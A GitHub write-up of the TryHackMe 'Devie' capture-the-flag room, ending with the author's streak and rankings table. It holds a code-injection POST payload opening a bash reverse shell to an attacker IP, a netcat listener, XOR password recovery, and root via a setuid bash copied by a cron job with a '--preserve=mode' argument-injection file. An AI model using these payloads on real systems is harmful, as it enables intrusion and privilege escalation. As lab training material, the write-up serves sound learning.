<h1 align="center">Devie</h1>
<p align="center"><img width="80px" src="https://github.com/user-attachments/assets/eb5d6cd5-41c1-44a2-a6bc-7d58c97774de"><br>
2025, September 12<br> Hey there, fellow lifelong learner! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>,<br>
and I’m excited to join you on this adventure, part of my <code>494</code>-day-streak in<a href="https://tryhackme.com"> TryHackMe</a>.<br>
<em>A developer has asked you to do a vulnerability check on their system</em>.<br>
Access it <a href="https://tryhackme.com/room/devie"</a>here.<br>
<img width="1200px" src="https://github.com/user-attachments/assets/b81bfd14-5b27-4c4a-bf51-3a423bab58b2"></p>


<h1></h1>

<h2>Nikto</h2>

:~# nikto -h 10.201.41.12:5000
- Nikto v2.1.5
---------------------------------------------------------------------------
+ Target IP:          10.201.41.12
+ Target Hostname:    10.201.41.12
+ Target Port:        5000
+ Start Time:         2025-09-12 06:03:39 (GMT1)
---------------------------------------------------------------------------
+ Server: Werkzeug/2.1.2 Python/3.8.10
+ The anti-clickjacking X-Frame-Options header is not present.
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Allowed HTTP Methods: POST, OPTIONS, HEAD, GET 
+ 6544 items checked: 0 error(s) and 2 item(s) reported on remote host
+ End Time:           2025-09-12 06:03:55 (GMT1) (16 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested


<h2>Nmap</h2>

:~# nmap -sC -sV -Pn-p-  -T4 10.201.41.12
Starting Nmap 7.80 ( https://nmap.org ) at 2025-09-12 06:01 BST
mass_dns: warning: Unable to open /etc/resolv.conf. Try using --system-dns or specify valid servers with --dns-servers
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
Nmap scan report for 10.201.41.12
Host is up (0.0050s latency).
Not shown: 998 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
5000/tcp open  upnp?
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Server: Werkzeug/2.1.2 Python/3.8.10
|     Date: Fri, 12 Sep 2025 05:01:43 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 4486
|     Connection: close
|     <!doctype html>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1">
|     <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.1/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-+0n0xVW2eSR5OomGNYDnhzAbDsOXxcvSN1TPprVMTNDbiYZCxYbOOl7+AMvyTG2x" crossorigin="anonymous">
|     <title>Math</title>
|     </head>
|     <body>
|     id="title">Math Formulas</p>
|     <main>
|     <section> <!-- Sections within the main -->
|     id="titles"> Feel free to use any of the calculators below:</h3>
|     <br>
|     <article> <!-- Sections within the section -->
|     id="titles">Quadratic formula</h4> 
|     <form met
|   RTSPRequest: 
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
|     "http://www.w3.org/TR/html4/strict.dtd">
|     <html>
|     <head>
|     <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
|     <title>Error response</title>
|     </head>
|     <body>
|     <h1>Error response</h1>
|     <p>Error code: 400</p>
|     <p>Message: Bad request version ('RTSP/1.0').</p>
|     <p>Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.</p>
|     </body>
|_    </html>
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port5000-TCP:V=7.80%I=7%D=9/12%Time=68C3A936%P=x86_64-pc-linux-gnu%r(Ge
SF:tRequest,1235,"HTTP/1\.1\x20200\x20OK\r\nServer:\x20Werkzeug/2\.1\.2\x2
SF:0Python/3\.8\.10\r\nDate:\x20Fri,\x2012\x20Sep\x202025\x2005:01:43\x20G
SF:MT\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x
SF:204486\r\nConnection:\x20close\r\n\r\n<!doctype\x20html>\n<html\x20lang
SF:=\"en\">\n\x20\x20<head>\n\x20\x20\x20\x20<meta\x20charset=\"utf-8\">\n
SF:\x20\x20\x20\x20<meta\x20name=\"viewport\"\x20content=\"width=device-wi
SF:dth,\x20initial-scale=1\">\n\n\x20\x20\x20\x20<link\x20href=\"https://c
SF:dn\.jsdelivr\.net/npm/bootstrap@5\.0\.1/dist/css/bootstrap\.min\.css\"\
SF:x20rel=\"stylesheet\"\x20integrity=\"sha384-\+0n0xVW2eSR5OomGNYDnhzAbDs
SF:OXxcvSN1TPprVMTNDbiYZCxYbOOl7\+AMvyTG2x\"\x20crossorigin=\"anonymous\">
SF:\n\n\x20\x20\x20\x20<title>Math</title>\n\x20\x20</head>\n\x20\x20<body
SF:>\n\x20\x20\x20\x20<p\x20id=\"title\">Math\x20Formulas</p>\n\n\x20\x20\
SF:x20\x20<main>\n\x20\x20\x20\x20\x20\x20<section>\x20\x20<!--\x20Section
SF:s\x20within\x20the\x20main\x20-->\n\n\t\t\t\t<h3\x20id=\"titles\">\x20F
SF:eel\x20free\x20to\x20use\x20any\x20of\x20the\x20calculators\x20below:</
SF:h3>\n\x20\x20\x20\x20\x20\x20\x20\x20<br>\n\t\t\t\t<article>\x20<!--\x2
SF:0Sections\x20within\x20the\x20section\x20-->\n\t\t\t\t\t\n\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20<h4\x20id=\"titles\">Quadratic\x20formula</h
SF:4>\x20\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\n\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20<form\x20met")%r(RTSPRequest,1F4,"<!DOCTYPE\x20HTML\
SF:x20PUBLIC\x20\"-//W3C//DTD\x20HTML\x204\.01//EN\"\n\x20\x20\x20\x20\x20
SF:\x20\x20\x20\"http://www\.w3\.org/TR/html4/strict\.dtd\">\n<html>\n\x20
SF:\x20\x20\x20<head>\n\x20\x20\x20\x20\x20\x20\x20\x20<meta\x20http-equiv
SF:=\"Content-Type\"\x20content=\"text/html;charset=utf-8\">\n\x20\x20\x20
SF:\x20\x20\x20\x20\x20<title>Error\x20response</title>\n\x20\x20\x20\x20<
SF:/head>\n\x20\x20\x20\x20<body>\n\x20\x20\x20\x20\x20\x20\x20\x20<h1>Err
SF:or\x20response</h1>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Error\x20code:\
SF:x20400</p>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Message:\x20Bad\x20reque
SF:st\x20version\x20\('RTSP/1\.0'\)\.</p>\n\x20\x20\x20\x20\x20\x20\x20\x2
SF:0<p>Error\x20code\x20explanation:\x20HTTPStatus\.BAD_REQUEST\x20-\x20Ba
SF:d\x20request\x20syntax\x20or\x20unsupported\x20method\.</p>\n\x20\x20\x
SF:20\x20</body>\n</html>\n");
MAC Address: 16:FF:F6:11:A9:EF (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 93.72 seconds






POST / HTTP/1.1
Host: 10.201.41.12:5000
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 104
Origin: http://10.201.41.12:5000
Connection: close
Referer: http://10.201.41.12:5000/
Upgrade-Insecure-Requests: 1
Priority: u=0, i

xa=__import__('os').system('/bin/bash -c \'bash -i >%26 /dev/tcp/10.201.68.205/1234 0>%261\'')#&xb=3












:~/Devie# nc -nlvp 1234
Listening on 0.0.0.0 1234
Connection received on 10.201.41.12 34336
bash: cannot set terminal process group (785): Inappropriate ioctl for device
bash: no job control in this shell
bruce@ip-10-201-41-12:~$ python3 -c 'import pty;pty.spawn("/bin/bash")'
python3 -c 'import pty;pty.spawn("/bin/bash")'
bruce@ip-10-201-41-12:~$ ^Z
[1]+  Stopped                 nc -nlvp 1234
root@ip-10-201-68-205:~/Devie# stty raw -echo; fg
nc -nlvp 1234

bruce@ip-10-201-41-12:~$ export TERM=xterm
bruce@ip-10-201-41-12:~$ pwd
/home/bruce
bruce@ip-10-201-41-12:~$ id
uid=1000(bruce) gid=1000(bruce) groups=1000(bruce)
bruce@ip-10-201-41-12:~$ ls
checklist  flag1.txt  note
bruce@ip-10-201-41-12:~$ cat flag1.txt
THM{Car3ful_witH_3v@l}
bruce@ip-10-201-41-12:~$ 


bruce@ip-10-201-41-12:~$ ll
total 44
drwxr-xr-x 4 bruce bruce 4096 Feb 20  2023 ./
drwxr-xr-x 5 root  root  4096 Sep 12 04:58 ../
lrwxrwxrwx 1 root  root     9 May 13  2022 .bash_history -> /dev/null
-rw-r--r-- 1 bruce bruce  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 bruce bruce 3771 Feb 25  2020 .bashrc
drwx------ 2 bruce bruce 4096 May 12  2022 .cache/
-rw-r--r-- 1 root  root   158 Feb 19  2023 checklist
-rw-r----- 1 root  bruce   23 May 12  2022 flag1.txt
-rw-r--r-- 1 root  root   355 Feb 20  2023 note
-rw-r--r-- 1 bruce bruce  807 Feb 25  2020 .profile
-rw-rw-r-- 1 bruce bruce   75 May 12  2022 .selected_editor
drwx------ 2 bruce bruce 4096 May 12  2022 .ssh/
-rw------- 1 bruce bruce    0 May 12  2022 .viminfo
bruce@ip-10-201-41-12:~$ cat note
Hello Bruce,

I have encoded my password using the super secure XOR format.

I made the key quite lengthy and spiced it up with some base64 at the end to make it even more secure. I'll share the decoding script for it soon. However, you can use my script located in the /opt/ directory.

For now look at this super secure string:
NEUEDTIeN1MRDg5K

Gordon
bruce@ip-10-201-41-12:~$ cat .bash_history
bruce@ip-10-201-41-12:~$ cat checklist
Web Application Checklist:
1. Built Site - check
2. Test Site - check
3. Move Site to production - check
4. Remove dangerous fuctions from site - check
Bruce
bruce@ip-10-201-41-12:~$ sudo -l
Matching Defaults entries for bruce on ip-10-201-41-12:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User bruce may run the following commands on ip-10-201-41-12:
    (gordon) NOPASSWD: /usr/bin/python3 /opt/encrypt.py
bruce@ip-10-201-41-12:~$ cd /opt
bruce@ip-10-201-41-12:/opt$ su gordon
Password: 
su: Authentication failure
bruce@ip-10-201-41-12:/opt$ 





bruce@ip-10-201-41-12:/opt$ sudo -u gordon /usr/bin/python3 /opt/encrypt.py
Enter a password to encrypt: hellohello
GxAcCR0bAA8eCg==
bruce@ip-10-201-41-12:/opt$ sudo -u gordon /usr/bin/python3 /opt/encrypt.py
Enter a password to encrypt: hellohellohellohello
GxAcCR0bAA8eChwOCRUXBxcUAx0=


<img width="1081" height="313" alt="image" src="https://github.com/user-attachments/assets/0e01e670-89ca-4101-b712-8498a5c0de83" />



bruce@ip-10-201-41-12:/opt$ su gordon
Password: 
gordon@ip-10-201-41-12:/opt$ cd /home/gordon
gordon@ip-10-201-41-12:~$ ls
backups  flag2.txt  reports
gordon@ip-10-201-41-12:~$ cat flag2.txt
THM{X0R_XoR_XOr_xOr}
gordon@ip-10-201-41-12:~$ 


gordon@ip-10-201-41-12:~$ sudo -l
[sudo] password for gordon: 
Sorry, user gordon may not run sudo on ip-10-201-41-12.
gordon@ip-10-201-41-12:~$ 



gordon@ip-10-201-41-12:~$ ls -la
total 32
drwxr-xr-x 4 gordon gordon 4096 Aug  2  2022 .
drwxr-xr-x 5 root   root   4096 Sep 12 04:58 ..
drwxrwx--- 2 gordon gordon 4096 Feb 19  2023 backups
lrwxrwxrwx 1 root   root      9 May 13  2022 .bash_history -> /dev/null
-rw-r--r-- 1 gordon gordon  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 gordon gordon 3771 Feb 25  2020 .bashrc
-rw-r----- 1 root   gordon   21 Aug  2  2022 flag2.txt
-rw-r--r-- 1 gordon gordon  807 Feb 25  2020 .profile
drwxrwx--- 2 gordon gordon 4096 Feb 19  2023 reports
-rw------- 1 gordon gordon    0 May 12  2022 .viminfo



gordon@ip-10-201-41-12:~/backups$ ls
report1  report2  report3
gordon@ip-10-201-41-12:~/backups$ cat report1
I am beginning to think that Batman is Bruce.....naahhh.
gordon@ip-10-201-41-12:~/backups$ cat report2
I told Bruce that the website is still vulnerable but he didn't listen.
gordon@ip-10-201-41-12:~/backups$ cat report3
Finished my XOR script. Found no vulnerabilities. Shared permissions with Bruce for execution only.



gordon@ip-10-201-41-12:/usr/bin$ cat backup
#!/bin/bash

cd /home/gordon/reports/

cp * /home/gordon/backups/








gordon@ip-10-201-41-12:~/reports$ cp /bin/bash .
gordon@ip-10-201-41-12:~/reports$ ls
bash  report1  report2  report3
gordon@ip-10-201-41-12:~/reports$ chmod +s bash
gordon@ip-10-201-41-12:~/reports$ ls -la
total 1176
drwxrwx--- 2 gordon gordon    4096 Sep 12 05:47 .
drwxr-xr-x 4 gordon gordon    4096 Aug  2  2022 ..
-rwsr-sr-x 1 gordon gordon 1183448 Sep 12 05:47 bash
-rw-r--r-- 1    640 gordon      57 Feb 19  2023 report1
-rw-r--r-- 1    640 gordon      72 Feb 19  2023 report2
-rw-r--r-- 1    640 gordon     100 Feb 19  2023 report3
gordon@ip-10-201-41-12:~/reports$ 




gordon@ip-10-201-41-12:~/reports$ touch ./--preserve=mode
gordon@ip-10-201-41-12:~/reports$ ls
 bash  '--preserve=mode'   report1   report2   report3
gordon@ip-10-201-41-12:~/reports$ ls -lah
total 1.2M
drwxrwx--- 2 gordon gordon 4.0K Sep 12 05:49  .
drwxr-xr-x 4 gordon gordon 4.0K Aug  2  2022  ..
-rwsr-sr-x 1 gordon gordon 1.2M Sep 12 05:47  bash
-rw-rw-r-- 1 gordon gordon    0 Sep 12 05:49 '--preserve=mode'
-rw-r--r-- 1    640 gordon   57 Feb 19  2023  report1
-rw-r--r-- 1    640 gordon   72 Feb 19  2023  report2
-rw-r--r-- 1    640 gordon  100 Feb 19  2023  report3
gordon@ip-10-201-41-12:~/reports$ ./bash -p
gordon@ip-10-201-41-12:~/reports$ cd ..
gordon@ip-10-201-41-12:~$ cd backups
gordon@ip-10-201-41-12:~/backups$ ls
bash  report1  report2  report3
gordon@ip-10-201-41-12:~/backups$ ./bash -p
bash-5.0# id
uid=1001(gordon) gid=1001(gordon) euid=0(root) egid=0(root) groups=0(root),1001(gordon)
bash-5.0# pwd
/home/gordon/backups
bash-5.0# cd /root
bash-5.0# ls
root.txt  snap
bash-5.0# cat root.txt
THM{J0k3r$_Ar3_W1ld}
bash-5.0# 








gordon@ip-10-201-41-12:~/reports$ ps -eo pid,cmd
    PID CMD
      1 /sbin/init maybe-ubiquity
      2 [kthreadd]
      3 [rcu_gp]
      4 [rcu_par_gp]
      5 [slub_flushwq]
      6 [netns]
      8 [kworker/0:0H-kblockd]
     10 [mm_percpu_wq]
     11 [rcu_tasks_rude_]
     12 [rcu_tasks_trace]
     13 [ksoftirqd/0]
     14 [rcu_sched]
     15 [migration/0]
     16 [idle_inject/0]
     18 [cpuhp/0]
     19 [cpuhp/1]
     20 [idle_inject/1]
     21 [migration/1]
     22 [ksoftirqd/1]
     24 [kworker/1:0H-events_highpri]
     25 [kdevtmpfs]
     26 [inet_frag_wq]
     27 [kauditd]
     28 [khungtaskd]
     29 [oom_reaper]
     30 [writeback]
     31 [kcompactd0]
     32 [ksmd]
     33 [khugepaged]
     38 [kworker/1:1-events]
     80 [kintegrityd]
     81 [kblockd]
     82 [blkcg_punt_bio]
     83 [xen-balloon]
     84 [tpm_dev_wq]
     85 [ata_sff]
     86 [md]
     87 [edac-poller]
     88 [devfreq_wq]
     89 [watchdogd]
     91 [kworker/1:1H-kblockd]
     93 [kswapd0]
     94 [ecryptfs-kthrea]
     96 [kthrotld]
     97 [acpi_thermal_pm]
     98 [xenbus]
    100 [xenwatch]
    101 [scsi_eh_0]
    102 [scsi_tmf_0]
    103 [scsi_eh_1]
    104 [scsi_tmf_1]
    106 [vfio-irqfd-clea]
    107 [kworker/0:1H-kblockd]
    108 [mld]
    109 [ipv6_addrconf]
    121 [kstrp]
    124 [zswap-shrink]
    125 [kworker/u31:0]
    130 [charger_manager]
    174 [cryptd]
    188 [kworker/0:2-events]
    229 [kdmflush]
    256 [raid5wq]
    308 [jbd2/dm-0-8]
    309 [ext4-rsv-conver]
    385 /lib/systemd/systemd-journald
    420 /lib/systemd/systemd-udevd
    541 [kaluad]
    542 [kmpath_rdacd]
    543 [kmpathd]
    544 [kmpath_handlerd]
    545 /sbin/multipathd -d -s
    561 [jbd2/xvda2-8]
    562 [ext4-rsv-conver]
    584 /lib/systemd/systemd-timesyncd
    645 /lib/systemd/systemd-networkd
    647 /lib/systemd/systemd-resolved
    703 /usr/lib/accountsservice/accounts-daemon
    704 /usr/bin/amazon-ssm-agent
    707 /usr/sbin/cron -f
    709 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --
    719 /usr/sbin/irqbalance --foreground
    725 /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers
    727 /usr/lib/policykit-1/polkitd --no-debug
    731 /usr/sbin/rsyslogd -n -iNONE
    737 /usr/lib/snapd/snapd
    738 /usr/sbin/CRON -f
    740 /lib/systemd/systemd-logind
    742 /usr/lib/udisks2/udisksd
    745 /usr/sbin/atd -f
    759 /sbin/agetty -o -p -- \u --keep-baud 115200,38400,9600 ttyS0 vt220
    767 /sbin/agetty -o -p -- \u --noclear tty1 linux
    778 /usr/sbin/ModemManager
    780 /usr/bin/python3 /usr/share/unattended-upgrades/unattended-upgrade-shutd
    785 /bin/sh -c /usr/bin/python3 /var/www/math/app.py
    786 /usr/bin/python3 /var/www/math/app.py



    gordon@ip-10-201-41-12:/var/www/math$ ll
total 36
drwxr-xr-x 5 bruce bruce 4096 Apr 27 10:39 ./
drwxr-xr-x 3 root  root  4096 Feb 20  2023 ../
-rw-rw-r-- 1 bruce bruce 3453 Feb 19  2023 app.py
-rw-rw-r-- 1 bruce bruce  219 May 12  2022 bisection.py
-rw-rw-r-- 1 bruce bruce  149 May 12  2022 prime.py
drwxrwxr-x 2 bruce bruce 4096 Apr 27 10:39 __pycache__/
-rw-rw-r-- 1 bruce bruce  284 May 12  2022 quadratic.py
drwxrwxr-x 2 bruce bruce 4096 Feb 20  2023 static/
drwxrwxr-x 2 bruce bruce 4096 Feb 19  2023 templates/

<br>
<br>
<h2 align="center">Completed</h2>
<p align="center"><img width="1200px" src="https://github.com/user-attachments/assets/5a3f8b7a-58e3-4d78-918d-6f257c9dcd78"><br>
                  <img width="1200px" src="https://github.com/user-attachments/assets/c98f341d-7820-4f69-9d49-8c57ead824fe"></p>

<h2 align="center">My TryHackMe Journey ・ 2025, September</h2>

<div align="center"><h6>

| Date              | Room                                  |Streak   |   All Time<br>Global   |   All Time<br>Brazil   |   Monthly<br>Global   |   Monthly<br>Brazil  | Points   | Rooms<br>Completed     | Badges    |
|:------------------|:--------------------------------------|--------:|:-----------: | :----------: | :---------: | :--------: | :------  | :-------: | :-------: |
| 2025, Sep 10      |Easy 🚩 - <code><strong>Devie</strong></code>                       | 494    |     110ᵗʰ    |      5ᵗʰ     |     607ᵗʰ    |     9ᵗʰ    | 125,606  |    959    |    73     |
| 2025, Sep 10      |Medium 🚩 - Backtrack, in progress     | 493    |     110ᵗʰ    |      5ᵗʰ     |     629ᵗʰ    |     9ᵗʰ    | 125,516  |    958    |    73     |
| 2025, Sep 10      |Easy 🔗 - Detecting Web Attacks        | 493    |     110ᵗʰ    |      5ᵗʰ     |     629ᵗʰ    |     9ᵗʰ    | 125,516  |    958    |    73     |
| 2025, Sep 10      |Easy 🔗 - Attacking ICS Plant #1       | 492    |     110ᵗʰ    |      5ᵗʰ     |     675ᵗʰ    |     9ᵗʰ    | 125,428  |    957    |    73     |
| 2025, Sep 10      |Easy 🔗 - SOC Role in Blue Team        | 492    |     110ᵗʰ    |      5ᵗʰ     |     664ᵗʰ    |     9ᵗʰ    | 125,292  |    956    |    73     |
| 2025, Sep 9       |Hard 🚩 - Python Playground            | 491    |     111ˢᵗ    |      5ᵗʰ     |     693ʳᵈ    |     9ᵗʰ    | 125,236  |    955    |    73     |
| 2025, Sep 9       |Hard 🚩 - Borderlands                  | 491    |     111ˢᵗ    |      5ᵗʰ     |     713ʳᵈ    |    10ᵗʰ    | 125,146  |    954    |    73     |
| 2025, Sep 9       |Medium 🚩 - Forgotten Implant          | 491    |     112ⁿᵈ    |      5ᵗʰ     |     660ᵗʰ    |    10ᵗʰ    | 125,016  |    953    |    73     |
| 2025, Sep 8       |Easy 🔗 - Web Enumeration              | 490    |     112ⁿᵈ    |      5ᵗʰ     |     663ʳᵈ    |    10ᵗʰ    | 124,986  |    952    |    73     |
| 2025, Sep 8       |Easy 🔗 - iOS: Forensics               | 490    |     113ʳᵈ    |      5ᵗʰ     |     548ᵗʰ    |     9ᵗʰ    | 124,850  |    951    |    73     |
| 2025, Sep 7       |Medium 🚩 - VulnNet: Active            | 489    |     114ᵗʰ    |      5ᵗʰ     |     542ⁿᵈ    |     9ᵗʰ    | 124,746  |    950    |    73     |
| 2025, Sep 7       |Medium 🚩 - pyLon                      | 489    |     114ᵗʰ    |      5ᵗʰ     |     535ᵗʰ    |     9ᵗʰ    | 124,716  |    949    |    73     |
| 2025, Sep 7       |Medium 🚩 - Pressed                    | 489    |     113ʳᵈ    |      5ᵗʰ     |     508ᵗʰ    |     9ᵗʰ    | 124,886  |    948    |    73     |
| 2025, Sep 6       |Easy 🚩 - Classic Passwd               | 488    |     114ᵗʰ    |      5ᵗʰ     |     683ʳᵈ    |    12ⁿᵈ    | 124,476  |    947    |    73     |
| 2025, Sep 6       |Medium 🚩 - toc2                       | 488    |     114ᵗʰ    |      5ᵗʰ     |     695ᵗʰ    |    12ⁿᵈ    | 124,446  |    946    |    73     |
| 2025, Sep 6       |Hard 🚩 - Extract                      | 488    |     114ᵗʰ    |      5ᵗʰ     |     716ᵗʰ    |    13ʳᵈ    | 124,386  |    945    |    73     |
| 2025, Sep 6       |Medium 🚩 - Plotted-EMR                | 488    |     114ᵗʰ    |      5ᵗʰ     |     844ᵗʰ    |    12ⁿᵈ    | 124,326  |    944    |    73     |
| 2025, Sep 5       |Medium 🚩 - Inferno                    | 487    |     114ᵗʰ    |      5ᵗʰ     |     758ᵗʰ    |    12ⁿᵈ    | 124,236  |    943    |    73     |
| 2025, Sep 5       |Easy 🔗 - Psycho Break                 | 487    |     115ᵗʰ    |      5ᵗʰ     |     724ᵗʰ    |    10ᵗʰ    | 124,152  |    942    |    73     |
| 2025, Sep 4       |Medium 🚩 - Cold VVars                 | 486    |     113ʳᵈ    |      5ᵗʰ     |     579ᵗʰ    |    10ᵗʰ    | 124,048  |    941    |    73     |
| 2025, Sep 4       |Medium 🔗 - IP and Domain Threat Intel | 486    |     113ʳᵈ    |	    5ᵗʰ     |     579ᵗʰ    |    10ᵗʰ    | 124,018  |   940    |    73     |
| 2025, Sep 3       |Easy 🔗 - Malware Classification       | 485    |     112ⁿᵈ    |      5ᵗʰ     |     714ᵗʰ    |    13ʳᵈ    | 123,882  |    939    |    73     |
| 2025, Sep 2       |Medium 🔗 - Session Forencics          | 484    |     111ˢᵗ    |      5ᵗʰ     |     706ᵗʰ    |    14ᵗʰ    | 123,786  |    938    |    73     |
| 2025, Sep 1       |Medium 🚩 - Voyage                     | 483    |     111ˢᵗ    |      5ᵗʰ     |     849ᵗʰ    |    15ᵗʰ    | 123,636  |    937    |    73     |
</h6></div><br>

<br>

<p align="center">Global All Time:   110ᵗʰ<br><img width="250px" src="https://github.com/user-attachments/assets/a90981d1-bf1c-4659-ad55-185cc6c4a23a"><br>
                                              <img width="1200px" src="https://github.com/user-attachments/assets/18299e44-c9b8-4a9c-badf-93633f988ce8"><br><br>
                  Brazil All Time:     5ᵗʰ<br><img width="1200px" src="https://github.com/user-attachments/assets/ebc74cb0-a55d-4519-9816-bc1ea279ea63"><br>
                  Global monthly:    607ᵗʰ<br><img width="1200px" src="https://github.com/user-attachments/assets/2618bb6f-b10f-4187-90f5-ec08996768a5"><br>
                  Brazil monthly:      9ᵗʰ<br><img width="1200px" src="https://github.com/user-attachments/assets/6df8e9b5-e47f-4477-ba22-bbff35f7dff4"><br>

<h2 align="center">Thanks for coming!</h2>
<p align="center">Follow me on <a href="https://medium.com/@RosanaFS">Medium</a>, here on <a href="https://github.com/RosanaFSS/TryHackMe">GitHub</a>, and on <a href="https://www.linkedin.com/in/rosanafssantos/">LinkedIN</a>.</p>  
